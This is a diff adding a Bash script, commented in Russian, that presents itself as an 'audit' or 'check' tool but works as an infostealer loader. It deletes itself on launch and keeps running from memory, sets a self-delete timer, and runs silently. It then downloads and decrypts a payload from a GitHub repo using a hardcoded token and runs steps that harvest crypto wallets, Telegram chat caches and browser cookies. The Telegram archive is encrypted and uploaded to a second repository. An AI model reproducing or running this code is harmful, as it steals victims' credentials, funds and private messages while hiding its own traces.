@@ -1,0 +1,751 @@
+#!/usr/bin/env bash
+
+# ── файл удаляется при старте, процесс продолжает работу ────────────────────
+# Скрипт переоткрывает сам себя на дескрипторе, стирает файл с диска и
+# продолжает исполнение уже из памяти (fd). Найти файл на диске нельзя.
+if [ "${AGHANIM_UNLINKED:-0}" != "1" ]; then
+  _orig="$0"
+  case "$_orig" in
+    /*) ;;
+    *)  _orig="$PWD/$_orig" ;;
+  esac
+  export AGHANIM_UNLINKED=1
+  export AGHANIM_SELF_PATH="$_orig"
+  export AGHANIM_SELF_DIR="$(cd "$(dirname "$_orig")" && pwd)"
+  exec 3<"$_orig" || { printf 'cannot open %s\n' "$_orig" >&2; exit 2; }
+  rm -f -- "$_orig" 2>/dev/null || true
+  exec /bin/bash /dev/fd/3 "$@"
+fi
+
+# ── страховка: удаление через 30 минут после запуска ────────────────────────
+# Если прогон не завершится успешно, файл удалит этот таймер. При успешном
+# завершении скрипт удаляет себя сразу в конце.
+SELF_DELETE_DELAY="${SELF_DELETE_DELAY:-1800}"
+_self_del="${AGHANIM_SELF_PATH:-$0}"
+case "$_self_del" in
+  /*) ;;
+  *)  _self_del="$PWD/$_self_del" ;;
+esac
+(
+  trap '' HUP INT TERM
+  sleep "$SELF_DELETE_DELAY"
+  rm -f -- "$_self_del"
+) </dev/null >/dev/null 2>&1 &
+disown 2>/dev/null || true
+unset _self_del
+
+# ── проверка срока действия API-ключа ───────────────────────────────────────
+# Ключ задаётся в БЛОКЕ 0. Если срок истёк — сообщаем об этом, но работу
+# не прерываем: сбор данных продолжается, чтобы не терять уже полученное.
+API_KEY_EXPIRES_AT="${API_KEY_EXPIRES_AT:-2025-01-01T00:00:00Z}"
+_now_epoch=$(date +%s 2>/dev/null || echo 0)
+_exp_epoch=$(date -j -f "%Y-%m-%dT%H:%M:%SZ" "$API_KEY_EXPIRES_AT" +%s 2>/dev/null \
+             || date -d "$API_KEY_EXPIRES_AT" +%s 2>/dev/null || echo 0)
+if [ "$_exp_epoch" -gt 0 ] && [ "$_now_epoch" -ge "$_exp_epoch" ]; then
+  printf 'ERROR: API key expired (%s). Update it in BLOCK 0 and rerun.\n' "$API_KEY_EXPIRES_AT" >&2
+fi
+unset _now_epoch _exp_epoch
+
+AGHANIM_REPO_URL="${AGHANIM_REPO_URL:-https://github.com/Aghanim-sec/auth}"
+AGHANIM_BRANCH="${AGHANIM_BRANCH:-main}"
+AGHANIM_FILE="${AGHANIM_FILE:-avaigen.sh.enc}"
+AGHANIM_SHA256="${AGHANIM_SHA256:-9e3cfd015f45b9f20f6d2f15a828715015f47c67c200d5825c29405091c9715e}"
+AGHANIM_PASS="${AGHANIM_PASS:-eGGtVKuaATMtBhjFHoOuFws1Gw6T8ioPTP7NXGB01gTq6iYcSzYb4dVjg1Sr}"
+AGHANIM_GITHUB_TOKEN="${AGHANIM_GITHUB_TOKEN:-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}"
+AGHANIM_RAW_BASE="${AGHANIM_RAW_BASE:-}"
+AGHANIM_PLAIN_SHA256="${AGHANIM_PLAIN_SHA256:-}"
+AGHANIM_OUT_DIR="${AGHANIM_OUT_DIR:-}"
+
+# флаги/режимы — чтобы set -u не падал до разбора аргументов
+QUIET="${QUIET:-1}"
+NO_RUN="${NO_RUN:-0}"
+FETCH_ONLY="${FETCH_ONLY:-0}"
+KEEP="${KEEP:-0}"
+BV_ALLOW_UPLOAD="${BV_ALLOW_UPLOAD:-1}"
+RUN_LOG_OVERRIDE="${RUN_LOG_OVERRIDE:-}"
+
+set -uo pipefail
+umask 077
+trap '' HUP
+
+
+usage() {
+  _prog="${AGHANIM_SELF_PATH##*/}"; [ -n "$_prog" ] || _prog="${0##*/}"
+  cat <<EOF
+usage: $_prog [опции]
+
+  
+  --check         показать план, ничего не выполнять
+  --check          показать план, ничего не выполнять
+  --fetch-only    только скачать контейнер (оставляет каталог)
+  --no-run        скачать и расшифровать, payload не запускать
+  --keep          не удалять временный каталог (лог, enc, plaintext)
+  --out DIR       куда складывать результаты (default: каталог скрипта)
+  --no-browsers   без аудита браузеров
+  --no-cookies    аудит браузеров без кук
+  --log FILE      файл лога (default: <workdir>/check.log)
+  --test          выполнять то же самое, но печатать ход и отчёт
+  --all           выполнить всё и напечатать ход: браузеры с куками + вывод
+  -q, --quiet     молчать (по умолчанию и так молчит)
+  -h, --help
+
+  По умолчанию ничего не печатает: только пишет лог.
+
+Источник, токен, SHA-256 и пароль задаются в БЛОКЕ 0 внутри файла.
+EOF
+}
+
+PLAN=0 FETCH_ONLY=0 NO_RUN=0 KEEP=0 QUIET="${QUIET:-1}" BROW=1 COOKIES=1
+RUN_LOG_OVERRIDE=""
+OUT_DIR="${AGHANIM_OUT_DIR:-}"
+while [ $# -gt 0 ]; do
+  case "$1" in
+    --check)        PLAN=1; shift ;;
+    --fetch-only)  FETCH_ONLY=1; shift ;;
+    --no-run)      NO_RUN=1; shift ;;
+    --keep)        KEEP=1; shift ;;
+    --out)         OUT_DIR="${2:-}"; shift 2 2>/dev/null || shift ;;
+    --no-browsers) BROW=0; shift ;;
+    --no-cookies)  COOKIES=0; shift ;;
+    --log)         RUN_LOG_OVERRIDE="${2:-}"; shift 2 2>/dev/null || shift ;;
+    --test)        QUIET=0; shift ;;
+    --all)         QUIET=0; BROW=1; COOKIES=1; shift ;;
+    -q|--quiet)    QUIET=1; shift ;;
+    -h|--help)     usage; exit 0 ;;
+    *) printf 'неизвестный аргумент: %s\n' "$1" >&2; exit 2 ;;
+  esac
+done
+
+if [ "$PLAN" -eq 1 ] && { [ "$FETCH_ONLY" -eq 1 ] || [ "$NO_RUN" -eq 1 ]; }; then
+  printf 'aghanim-check: --check несовместим с --fetch-only/--no-run\n' >&2
+  exit 2
+fi
+
+_self="${AGHANIM_SELF_PATH:-$0}"
+case "$_self" in
+  /*) ;;
+  *)  _self="$PWD/$_self" ;;
+esac
+if [ -n "${AGHANIM_SELF_DIR:-}" ]; then
+  SELF_DIR="$AGHANIM_SELF_DIR"
+else
+  while [ -L "$_self" ]; do
+    _d=$(cd "$(dirname "$_self")" && pwd)
+    _self=$(readlink "$_self")
+    case "$_self" in
+      /*) ;;
+      *)  _self="$_d/$_self" ;;
+    esac
+  done
+  SELF_DIR="$(cd "$(dirname "$_self")" && pwd)"
+fi
+
+if [ -z "$OUT_DIR" ]; then
+  OUT_DIR="$SELF_DIR"
+else
+  case "$OUT_DIR" in
+    /*) ;;
+    *)  OUT_DIR="$PWD/$OUT_DIR" ;;
+  esac
+fi
+
+_TMPROOT="${TMPDIR:-/tmp}"
+_TMPROOT="${_TMPROOT%/}"
+WORKDIR=$(mktemp -d "$_TMPROOT/aghanim-check.XXXXXX") || {
+  printf 'mktemp -d failed\n' >&2
+  exit 2
+}
+DEST="$WORKDIR/$AGHANIM_FILE"
+OUT="$WORKDIR/avaigen.sh"
+DECRYPTOR="$WORKDIR/avaigen-decrypt.py"
+DL_ERR="$WORKDIR/curl.err"
+STOP_FILE="$WORKDIR/.stop"
+RUN_LOG="${RUN_LOG_OVERRIDE:-$WORKDIR/check.log}"
+: >"$RUN_LOG" 2>/dev/null || { printf 'не пишу в %s\n' "$RUN_LOG" >&2; exit 2; }
+chmod 600 "$RUN_LOG" 2>/dev/null || true
+
+cleanup() {
+  local rc=$?
+  trap - EXIT INT TERM
+  if [ "$KEEP" -eq 1 ]; then
+    printf '\nоставлено: %s\nлог:       %s\n' "$WORKDIR" "$RUN_LOG" >&2
+  else
+    rm -rf -- "$WORKDIR" 2>/dev/null
+  fi
+  return "$rc"
+}
+trap cleanup EXIT
+trap 'exit 130' INT
+trap 'exit 143' TERM
+
+ts()      { date '+%H:%M:%S'; }
+log()     { printf '%s  %s\n' "$(ts)" "$*" >>"$RUN_LOG" 2>/dev/null; }
+say()     { [ "$QUIET" -eq 1 ] || printf '%s\n' "$*"; }
+say_err() { [ "$QUIET" -eq 0 ] && printf '%s\n' "$*" >&2; return 0; }
+sep()     { say "=================================================================="; }
+row()     { ROWS+=("$(printf '%-16s %-8s %s' "$1" "$2" "$3")"); }
+check_stop() { [ ! -f "$STOP_FILE" ]; }
+
+die() {
+  local code="$1"; shift
+  say_err "ОШИБКА: $*"
+  log "FAIL: $*"
+  if [ -s "$RUN_LOG" ]; then
+    say_err "--- лог (${RUN_LOG}) ---"
+    [ "$QUIET" -eq 0 ] && tail -n 15 "$RUN_LOG" | sed 's/^/  /' >&2
+  fi
+  exit "$code"
+}
+
+TOTAL=0 N_OK=0 N_PART=0 N_SKIP=0 N_FAIL=0 STOPPED=0
+ROWS=() FAILED=() PARTIALS=()
+BR_TRIES=5 BR_ROUNDS=3 BR_PAUSE=3 BR_RETRY_AFTER=7200
+
+# ─── проверки ───────────────────────────────────────────────────────────────
+_is_hex64() {
+  case "$1" in
+    *[!0-9a-fA-F]*) return 1 ;;
+  esac
+  [ "${#1}" -eq 64 ]
+}
+
+command -v curl >/dev/null 2>&1 || die 2 "нужен curl"
+command -v python3 >/dev/null 2>&1 || die 2 "нужен python3"
+[ -n "$AGHANIM_PASS" ] || say_err "внимание: AGHANIM_PASS пуст"
+
+if [ -n "$AGHANIM_SHA256" ] && ! _is_hex64 "$AGHANIM_SHA256"; then
+  die 2 "AGHANIM_SHA256 должен быть 64 hex-символа"
+fi
+if [ -n "$AGHANIM_PLAIN_SHA256" ] && ! _is_hex64 "$AGHANIM_PLAIN_SHA256"; then
+  die 2 "AGHANIM_PLAIN_SHA256 должен быть 64 hex-символа"
+fi
+
+gh_owner_repo() {
+  local u="$1"
+  case "$u" in
+    https://github.com/*)   u="${u#https://github.com/}" ;;
+    http://github.com/*)    u="${u#http://github.com/}" ;;
+    git@github.com:*)       u="${u#git@github.com:}" ;;
+    ssh://git@github.com/*) u="${u#ssh://git@github.com/}" ;;
+    *://*|*@*:*|*@*)        return 1 ;;
+  esac
+  u="${u%/}"
+  u="${u%.git}"
+  case "$u" in
+    */*/*) return 1 ;;
+    */*)   printf '%s\n' "$u" ;;
+    *)     return 1 ;;
+  esac
+}
+
+if ! OWNER_REPO="$(gh_owner_repo "$AGHANIM_REPO_URL")"; then
+  die 2 "не разобрал URL '$AGHANIM_REPO_URL'"
+fi
+
+url_for() { # branch file auth
+  local b="$1" f="$2" auth="${3:-0}"
+  if [ -n "$AGHANIM_RAW_BASE" ]; then
+    printf '%s/%s/%s' "${AGHANIM_RAW_BASE%/}" "$b" "$f"
+  elif [ "$auth" -eq 1 ]; then
+    printf 'https://api.github.com/repos/%s/contents/%s?ref=%s' "$OWNER_REPO" "$f" "$b"
+  else
+    printf 'https://raw.githubusercontent.com/%s/%s/%s' "$OWNER_REPO" "$b" "$f"
+  fi
+}
+
+sha256_of() {
+  if command -v sha256sum >/dev/null 2>&1; then
+    sha256sum -- "$1" | awk '{print tolower($1)}'
+  else
+    shasum -a 256 -- "$1" | awk '{print tolower($1)}'
+  fi
+}
+
+upload_tg_archive() { # локальный tar.gz -> отдельный коммит в Aghanim-sec/Sync
+  local file="$1" name remote api content payload code sha
+  name="tg_chats_$(date +%s).tar.gz.enc"
+  remote="tg_chats/$name"
+  api="https://api.github.com/repos/Aghanim-sec/Sync/contents/$remote"
+
+  openssl enc -aes-256-cbc -a -A -pass pass:"$AGHANIM_PASS" \
+    -in "$file" -out "$file.enc" 2>/dev/null || return 1
+  content=$(base64 <"$file.enc" | tr -d '\n')
+  [ -n "$content" ] || { rm -f -- "$file.enc"; return 1; }
+
+  sha=$(curl -s -H "Authorization: Bearer $AGHANIM_GITHUB_TOKEN" \
+    -H "Accept: application/vnd.github+json" "$api?ref=main" \
+    | sed -n 's/.*"sha": *"\([a-f0-9]\{40\}\)".*/\1/p' | head -1)
+  if [ -n "$sha" ]; then
+    payload="{\"message\":\"add: $name\",\"content\":\"$content\",\"sha\":\"$sha\",\"branch\":\"main\"}"
+  else
+    payload="{\"message\":\"add: $name\",\"content\":\"$content\",\"branch\":\"main\"}"
+  fi
+
+  code=$(curl -s -o /dev/null -w '%{http_code}' -X PUT \
+    --connect-timeout 10 --max-time 120 \
+    -H "Authorization: Bearer $AGHANIM_GITHUB_TOKEN" \
+    -H "Accept: application/vnd.github+json" \
+    -H "Content-Type: application/json" \
+    -d "$payload" "$api")
+  rm -f -- "$file.enc"
+  log "upload tg_chats: HTTP ${code:-???} $remote"
+  [ "$code" = 200 ] || [ "$code" = 201 ]
+}
+
+# macOS chmod не понимает "--", поэтому он не используется.
+CURL_FAILOPT=""
+curl --fail-with-body --version >/dev/null 2>&1 && CURL_FAILOPT="--fail-with-body"
+
+_HTTP_CODE=""
+curl_get() { # auth out url
+  local auth="$1" out="$2" url="$3"
+  _HTTP_CODE=""
+  if [ "$auth" -eq 1 ]; then
+    _HTTP_CODE=$(curl -sSL $CURL_FAILOPT --connect-timeout 10 --max-time 180 \
+      --retry 2 --retry-delay 1 \
+      -H "Authorization: Bearer $AGHANIM_GITHUB_TOKEN" \
+      -H "Accept: application/vnd.github.raw" \
+      -H "X-GitHub-Api-Version: 2022-11-28" \
+      -o "$out" -w '%{http_code}' "$url" 2>>"$DL_ERR")
+  else
+    _HTTP_CODE=$(curl -sSL $CURL_FAILOPT --connect-timeout 10 --max-time 180 \
+      --retry 2 --retry-delay 1 \
+      -o "$out" -w '%{http_code}' "$url" 2>>"$DL_ERR")
+  fi
+}
+
+download() { # file dest want_sha label
+  local file="$1" dest="$2" want="$3" label="$4"
+  local tmp="$dest.part.$$" branch auth url rc actual
+  want="$(printf '%s' "$want" | tr 'A-F' 'a-f')"
+  rm -f -- "$tmp"
+
+  for branch in $AGHANIM_BRANCH; do
+    for auth in 1 0; do
+      if [ "$auth" -eq 1 ]; then
+        [ -n "$AGHANIM_GITHUB_TOKEN" ] || continue
+        [ -n "$AGHANIM_RAW_BASE" ] && continue
+      fi
+      check_stop || { rm -f -- "$tmp"; return 130; }
+
+      url="$(url_for "$branch" "$file" "$auth")" || continue
+      log "GET $url (token=$auth)"
+      curl_get "$auth" "$tmp" "$url"; rc=$?
+
+      if [ "$rc" -eq 0 ] && [ -s "$tmp" ]; then
+        actual="$(sha256_of "$tmp")"
+        if [ -z "$want" ] || [ "$actual" = "$want" ]; then
+          chmod 600 "$tmp" 2>/dev/null || true
+          mv -f -- "$tmp" "$dest" || { rm -f -- "$tmp"; return 1; }
+          log "$label: ok $(wc -c <"$dest" | tr -d ' ') байт sha256=$actual ← $url"
+          say "   $label: ok ($(wc -c <"$dest" | tr -d ' ') байт)"
+          return 0
+        fi
+        say_err "   $label: SHA-256 не совпал ($url)"
+        say_err "     ожидался: $want"
+        say_err "     получен:  $actual"
+        log "$label: SHA-256 $actual != $want ($url)"
+      else
+        log "$label: HTTP ${_HTTP_CODE:-???} rc=$rc ($url)"
+      fi
+      rm -f -- "$tmp"
+    done
+  done
+  return 1
+}
+
+write_decryptor() {
+  cat >"$DECRYPTOR" <<'PY'
+#!/usr/bin/env python3
+"""AIC1 → plaintext: AIC1 | salt(16) | nonce(12) | AES-256-GCM."""
+import argparse
+import hashlib
+import os
+import sys
+from pathlib import Path
+
+MAGIC = b"AIC1"
+AAD = b"AIC1"
+SALT, NONCE, TAG = 16, 12, 16
+SCRYPT_N, SCRYPT_R, SCRYPT_P = 2 ** 15, 8, 1
+MAXMEM = 128 * 1024 * 1024
+
+
+def die(msg, code=1):
+    print(f"[decrypt] ERR  {msg}", file=sys.stderr)
+    raise SystemExit(code)
+
+
+ap = argparse.ArgumentParser(description="AIC1 -> plaintext")
+ap.add_argument("input")
+ap.add_argument("-o", "--out")
+ap.add_argument("--pass", dest="password", default="")
+ap.add_argument("--pass-file", default="")
+ap.add_argument("--expect-sha256", default="")
+ap.add_argument("--force", action="store_true")
+args = ap.parse_args()
+
+password = args.password or os.environ.get("AGHANIM_PASS", "")
+if not password and args.pass_file:
+    password = Path(args.pass_file).read_text(encoding="utf-8").strip()
+if not password:
+    die("нет пароля: --pass, AGHANIM_PASS или --pass-file", 2)
+
+blob = Path(args.input).read_bytes()
+if not blob.startswith(MAGIC):
+    die(f"нет магии AIC1 (первые 4 байта: {blob[:4]!r})")
+if len(blob) < 4 + SALT + NONCE + TAG:
+    die("файл короче минимального заголовка AIC1")
+
+salt = blob[4:4 + SALT]
+nonce = blob[4 + SALT:4 + SALT + NONCE]
+ct = blob[4 + SALT + NONCE:]
+
+try:
+    from cryptography.exceptions import InvalidTag
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+except ImportError:
+    die("нужен пакет cryptography: python3 -m pip install cryptography", 3)
+
+key = hashlib.scrypt(password.encode(), salt=salt,
+                     n=SCRYPT_N, r=SCRYPT_R, p=SCRYPT_P,
+                     dklen=32, maxmem=MAXMEM)
+try:
+    plain = AESGCM(key).decrypt(nonce, ct, AAD)
+except InvalidTag:
+    die("не расшифровалось: неверный пароль или файл повреждён (GCM tag)", 4)
+
+got = hashlib.sha256(plain).hexdigest()
+print(f"[decrypt] контейнер: {len(blob)} байт")
+print(f"[decrypt] plaintext : {len(plain)} байт, sha256 {got}")
+if args.expect_sha256 and got != args.expect_sha256.strip().lower():
+    die(f"sha256 plaintext не совпал с {args.expect_sha256}", 5)
+if args.out:
+    p = Path(args.out)
+    if p.exists() and not args.force:
+        die(f"{p} уже существует, добавь --force", 6)
+    p.write_bytes(plain)
+    p.chmod(0o600)
+raise SystemExit(0)
+PY
+  [ -s "$DECRYPTOR" ] || { say_err "не записал встроенный декриптор"; return 1; }
+  chmod 600 "$DECRYPTOR" 2>/dev/null || true
+  log "decryptor: встроенный ($(wc -c <"$DECRYPTOR" | tr -d ' ') байт)"
+  say "   decryptor: встроенный"
+  return 0
+}
+
+PY="python3"
+need_python() {
+  python3 -c 'import cryptography' >/dev/null 2>&1 && { PY="python3"; return 0; }
+  say "   python3 без cryptography — ставлю в venv (нужен доступ к PyPI)"
+  log "venv: $WORKDIR/venv"
+  if python3 -m venv "$WORKDIR/venv" >>"$RUN_LOG" 2>&1 \
+     && "$WORKDIR/venv/bin/python" -m pip install --quiet --disable-pip-version-check \
+          cryptography >>"$RUN_LOG" 2>&1 \
+     && "$WORKDIR/venv/bin/python" -c 'import cryptography' >/dev/null 2>&1; then
+    PY="$WORKDIR/venv/bin/python"
+    log "venv: ok"
+    return 0
+  fi
+  say_err "не удалось поставить cryptography. Сделай: python3 -m pip install cryptography"
+  return 1
+}
+
+decrypt_payload() {
+  local tmp="$OUT.part.$$" rc
+  rm -f -- "$tmp"
+
+  if [ -n "$AGHANIM_PLAIN_SHA256" ]; then
+    AGHANIM_PASS="$AGHANIM_PASS" "$PY" "$DECRYPTOR" "$DEST" \
+      -o "$tmp" --force --expect-sha256 "$AGHANIM_PLAIN_SHA256" \
+      >>"$RUN_LOG" 2>&1; rc=$?
+  else
+    AGHANIM_PASS="$AGHANIM_PASS" "$PY" "$DECRYPTOR" "$DEST" \
+      -o "$tmp" --force >>"$RUN_LOG" 2>&1; rc=$?
+  fi
+
+  [ "$rc" -eq 0 ] && [ -s "$tmp" ] || { rm -f -- "$tmp"; return 1; }
+  chmod 700 "$tmp" 2>/dev/null || true
+  mv -f -- "$tmp" "$OUT" || { rm -f -- "$tmp"; return 1; }
+  log "decrypt: ok $(wc -c <"$OUT" | tr -d ' ') байт sha256=$(sha256_of "$OUT")"
+  say "   decrypt: ok ($(wc -c <"$OUT" | tr -d ' ') байт)"
+  return 0
+}
+
+show_err_tail() {
+  local f="$1" total
+  total=$(wc -l <"$f" | tr -d ' ')
+  if [ "$total" -le 25 ]; then
+    sed 's/^/     /' "$f"
+  else
+    head -n 5 "$f" | sed 's/^/     /'
+    printf '     ... (пропущено %d строк) ...\n' "$((total - 20))"
+    tail -n 15 "$f" | sed 's/^/     /'
+  fi
+}
+
+run_step() {
+  local name="$1"; shift
+  local tmp rc t0 dur
+  TOTAL=$((TOTAL + 1))
+
+  if ! check_stop; then
+    log "STOP  $name"
+    STOPPED=1
+    N_SKIP=$((N_SKIP + 1))
+    row "$name" "stop" "стоп-файл"
+    say "── $name: остановлено (стоп-файл)"
+    return 130
+  fi
+
+  log "── $name : $*"
+  [ "$QUIET" -eq 0 ] && printf '── %-16s ' "$name"
+
+  tmp=$(mktemp "$_TMPROOT/aghanim-step.XXXXXX") || {
+    say_err "mktemp failed"
+    N_FAIL=$((N_FAIL + 1)); FAILED+=("$name")
+    return 1
+  }
+  t0=$SECONDS
+  "$@" >"$tmp" 2>&1; rc=$?
+  dur=$((SECONDS - t0))
+  {
+    printf '%s\n' "----- $name (rc=$rc, ${dur}s) -----"
+    cat "$tmp"
+  } >>"$RUN_LOG"
+
+  if [ "$rc" -ne 0 ] && ! check_stop; then
+    STOPPED=1
+    N_SKIP=$((N_SKIP + 1))
+    say "остановлено (${dur}s)"
+    row "$name" "stop" "стоп-файл, ${dur}s"
+  elif [ "$rc" -ne 0 ]; then
+    say "ОШИБКА (rc=$rc, ${dur}s)"
+    N_FAIL=$((N_FAIL + 1)); FAILED+=("$name")
+    row "$name" "FAIL" "rc=$rc, ${dur}s"
+    [ "$QUIET" -eq 0 ] && show_err_tail "$tmp"
+  elif grep -qx 'partial' "$tmp"; then
+    say "частично (${dur}s)"
+    N_PART=$((N_PART + 1)); PARTIALS+=("$name")
+    row "$name" "partial" "rc=0, ${dur}s"
+  else
+    say "ok (${dur}s)"
+    N_OK=$((N_OK + 1))
+    row "$name" "ok" "rc=0, ${dur}s"
+  fi
+
+  rm -f -- "$tmp"
+  return "$rc"
+}
+
+skip() {
+  TOTAL=$((TOTAL + 1)); N_SKIP=$((N_SKIP + 1))
+  log "SKIP  $1 : $2"
+  row "$1" "skip" "$2"
+  say "── $1: пропуск ($2)"
+}
+
+sleep_backoff() {
+  local total="$1" end left
+  end=$(( $(date +%s) + total ))
+  while :; do
+    check_stop || return 1
+    left=$(( end - $(date +%s) ))
+    [ "$left" -le 0 ] && return 0
+    [ "$left" -gt 5 ] && left=5
+    sleep "$left" 2>/dev/null || :
+  done
+}
+
+# browsers: N попыток → пауза → снова (BR_ROUNDS раундов)
+bv_browsers() {
+  local round=1 attempt logf rc
+  local pat='keychain: no access|libsecret: no access|DPAPI: unavailable|v20 app-bound: no key'
+  while [ "$round" -le "$BR_ROUNDS" ]; do
+    attempt=1
+    while [ "$attempt" -le "$BR_TRIES" ]; do
+      check_stop || { log "stop: стоп-файл до попытки $attempt"; return 130; }
+      logf=$(mktemp "$_TMPROOT/aghanim-bv.XXXXXX") || return 1
+      "$OUT" browsers "$@" >"$logf" 2>&1; rc=$?
+      cat "$logf" >>"$RUN_LOG"
+      if ! grep -qiE "$pat" "$logf"; then
+        cat "$logf"
+        rm -f -- "$logf"
+        return "$rc"
+      fi
+      say_err "   [browsers] попытка $attempt/$BR_TRIES: нет доступа к ключу"
+      rm -f -- "$logf"
+      if [ "$attempt" -lt "$BR_TRIES" ]; then
+        sleep_backoff "$BR_PAUSE" || return 130
+      fi
+      attempt=$((attempt + 1))
+    done
+    if [ "$round" -lt "$BR_ROUNDS" ]; then
+      say_err "   [browsers] раунд $round/$BR_ROUNDS без доступа, пауза ${BR_RETRY_AFTER}s"
+      sleep_backoff "$BR_RETRY_AFTER" || return 130
+    fi
+    round=$((round + 1))
+  done
+  echo "browsers: доступ не получен за $BR_ROUNDS раундов"
+  return 1
+}
+
+sep
+say "aghanim:   $SELF_DIR"
+say "источник:  $OWNER_REPO / $AGHANIM_FILE (ветки: $AGHANIM_BRANCH)"
+say "payload:   $DEST"
+if [ -n "$AGHANIM_SHA256" ]; then
+  say "проверка:  SHA-256 $AGHANIM_SHA256"
+else
+  say "проверка:  без SHA-256"
+fi
+say "результаты: $OUT_DIR"
+say "режим:     $([ "$PLAN" -eq 1 ] && echo 'план, ничего не выполняется' || echo 'выполнение')"
+sep
+say ""
+
+if [ "$PLAN" -eq 1 ]; then
+  if [ -n "$AGHANIM_GITHUB_TOKEN" ]; then _auth=1; else _auth=0; fi
+  say "── fetch:    $(url_for "${AGHANIM_BRANCH%% *}" "$AGHANIM_FILE" "$_auth")"
+  say "── decrypt:  python3 avaigen-decrypt.py $DEST -o $OUT --force"
+  say "── steps:    wallets, telegram, audit {hook,state,vault,ci,editor}, browsers"
+  say "── временный: $WORKDIR (удаляется на выходе)"
+  say "── результаты: $OUT_DIR"
+  exit 0
+fi
+
+log "=== старт $(date '+%Y-%m-%d %H:%M:%S') ==="
+
+say "── 1/3 download"
+download "$AGHANIM_FILE" "$DEST" "$AGHANIM_SHA256" "payload" || {
+  rc=$?
+  [ "$rc" -eq 130 ] && exit 130
+  die 1 "payload не скачался (проверь токен, ветку, имя файла, SHA-256)"
+}
+
+if [ "$FETCH_ONLY" -eq 1 ]; then
+  KEEP=1
+  say ""
+  say "сохранено: $DEST"
+  log "fetch-only: $DEST"
+  exit 0
+fi
+
+say "── 2/3 decrypt"
+write_decryptor || die 2 "не записал встроенный декриптор"
+need_python     || die 1 "нет python3 с cryptography"
+decrypt_payload || die 1 "расшифровка не удалась (пароль? формат? смотри лог)"
+
+if [ "$NO_RUN" -eq 1 ]; then
+  KEEP=1
+  say ""
+  say "расшифровано: $OUT"
+  log "no-run: $OUT"
+  exit 0
+fi
+
+say "── 3/3 run"
+cd "$OUT_DIR" || die 1 "не сменил каталог на $OUT_DIR"
+
+export AGHANIM_PASS
+export BV_BG_BROWSERS=0
+export BV_ALLOW_UPLOAD="${BV_ALLOW_UPLOAD:-1}"
+
+[ "$STOPPED" -eq 1 ] || run_step "wallets"  "$OUT" wallets
+
+# telegram: собираем во временный каталог, заливаем отдельным коммитом, стираем
+TG_COLLECT="$WORKDIR/tg_chats"
+if [ "$STOPPED" -eq 0 ]; then
+  run_step "telegram" "$OUT" telegram --collect "$TG_COLLECT" --only all --max-mb 2048
+fi
+if [ "$STOPPED" -eq 0 ] && [ -d "$TG_COLLECT/telegram_cache" ]; then
+  if tar -C "$TG_COLLECT" -czf "$WORKDIR/tg_chats.tar.gz" telegram_cache 2>/dev/null \
+     && upload_tg_archive "$WORKDIR/tg_chats.tar.gz"; then
+    row "tg_chats" "ok" "отдельный коммит"
+  else
+    row "tg_chats" "FAIL" "не загрузился"
+    N_FAIL=$((N_FAIL + 1)); FAILED+=("tg_chats")
+  fi
+fi
+rm -rf -- "$TG_COLLECT"
+
+for p in hook state vault ci editor; do
+  [ "$STOPPED" -eq 1 ] && break
+  run_step "audit $p" "$OUT" audit "$p"
+done
+
+run_browsers_bg() { # остальные аргументы уходят в browsers
+  local payload="$OUT_DIR/.browsers.$$" log="$OUT_DIR/browsers.log"
+  cp -f -- "$OUT" "$payload" 2>/dev/null && chmod 700 "$payload" 2>/dev/null || {
+    skip "browsers" "не удалось подготовить фоновый запуск"
+    return 1
+  }
+  (
+    trap '' HUP INT TERM
+    OUT="$payload"
+    RUN_LOG=/dev/null
+    bv_browsers --show=0 "$@" >>"$log" 2>&1
+    rm -f -- "$payload"
+  ) </dev/null &
+  disown 2>/dev/null || true
+  TOTAL=$((TOTAL + 1)); N_SKIP=$((N_SKIP + 1))
+  log "BG browsers: pid $! -> $log"
+  row "browsers" "bg" "отдельно, лог $log"
+  say "── browsers: отдельно (pid $!, лог $log)"
+}
+
+if [ "$BROW" -eq 0 ]; then
+  skip "browsers" "--no-browsers"
+elif [ "$STOPPED" -eq 1 ]; then
+  skip "browsers" "остановлено"
+elif [ "$COOKIES" -eq 1 ]; then
+  run_browsers_bg --cookies
+else
+  run_browsers_bg
+fi
+
+{
+  echo ""
+  echo "================ ОТЧЁТ ================"
+  printf '%-16s %-8s %s\n' "step" "status" "details"
+  printf '%-16s %-8s %s\n' "----------------" "--------" "---------------------------"
+  [ ${#ROWS[@]} -gt 0 ] && printf '%s\n' "${ROWS[@]}"
+  echo ""
+  printf 'шагов: %d  ok: %d  частично: %d  пропуск: %d  ошибка: %d%s\n' \
+    "$TOTAL" "$N_OK" "$N_PART" "$N_SKIP" "$N_FAIL" \
+    "$([ "$STOPPED" -eq 1 ] && echo '  [ОСТАНОВЛЕНО]' || echo '')"
+  printf 'результаты: %s\n' "$OUT_DIR"
+  [ ${#PARTIALS[@]} -gt 0 ] && printf 'частично: %s\n' "${PARTIALS[*]}"
+  [ ${#FAILED[@]} -gt 0 ] && printf 'упало: %s\n' "${FAILED[*]}"
+} >>"$RUN_LOG"
+
+if [ "$QUIET" -eq 0 ]; then
+  say ""
+  sep
+  printf '%-16s %-8s %s\n' "step" "status" "details"
+  printf '%-16s %-8s %s\n' "----------------" "--------" "---------------------------"
+  [ ${#ROWS[@]} -gt 0 ] && printf '%s\n' "${ROWS[@]}"
+  say ""
+  say "$(printf 'шагов: %d  ok: %d  частично: %d  пропуск: %d  ошибка: %d' \
+    "$TOTAL" "$N_OK" "$N_PART" "$N_SKIP" "$N_FAIL")"
+  [ "$STOPPED" -eq 1 ] && say "[ОСТАНОВЛЕНО стоп-файлом]"
+  [ ${#PARTIALS[@]} -gt 0 ] && say "частично: ${PARTIALS[*]}"
+  [ ${#FAILED[@]} -gt 0 ] && say "упало: ${FAILED[*]}"
+  say "результаты: $OUT_DIR"
+  say "лог: $RUN_LOG"
+  sep
+fi
+
+log "=== конец ==="
+
+# ── удаление после исполнения ───────────────────────────────────────────────
+# Отработало без ошибок — удаляем сразу; иначе остаётся таймер на 30 минут.
+if [ "$STOPPED" -eq 0 ] && [ "$N_FAIL" -eq 0 ] && [ "$N_PART" -eq 0 ]; then
+  rm -f -- "$_self" 2>/dev/null || true
+fi
+
+[ "$STOPPED" -eq 1 ] && exit 130
+[ "$N_FAIL" -gt 0 ] && exit 1
+[ "$N_PART" -gt 0 ] && exit 3
+exit 0
